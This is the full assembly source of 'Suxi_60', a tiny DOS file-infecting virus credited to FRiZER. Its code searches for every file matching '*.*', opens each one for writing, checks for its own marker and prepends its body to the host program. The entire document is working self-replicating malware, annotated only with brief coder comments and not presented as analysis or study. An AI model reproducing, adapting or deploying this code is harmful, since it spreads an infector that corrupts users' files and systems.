;       [ Suxi_60 ]     (c) FRiZER
        .model tiny
        .code
        .startup
s:
        db      '*.*',0         ; sub cx,[002Ah]
        xchg    ax,cx           ; cx = 0
        mov     bp,e-s          ; bp = vir.size
        mov     ah,4Eh          ; find first
        mov     dx,si           ; mask
i:
        int     21h
        jb      i               ; if error => ah = 00 (Terminate Program)
        mov     ax,3D02h        ; open (r/w)
        mov     dx,9Eh
        int     21h
        xchg    bx,ax           ; bx = handle
        mov     ah,3Fh          ; read
        push    sp              ; :-(
        pop     cx
        lea     dx,[si+bp]      ; buffer - afta vir.body
        int     21h
        cmp     [si+bp],byte ptr 02Ah   ; is it me ?
        je      f               ; yes - find next
        add     ax,bp
        push    ax              ; ax - vir.size + prog.size
        xor     cx,cx
        mul     cx              ; ax=cx=dx=0
        mov     ah,42h          ; lseek 2 begin
        int     21h
        mov     dx,si           ; write vir.body + prog.body
        pop     cx              ; rememba size
        mov     ah,40h
        int     21h
f:
        mov     ah,4fh          ; find next
        jmp     i
e:
        end
[ End "SUXI_60.ASM" ]컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
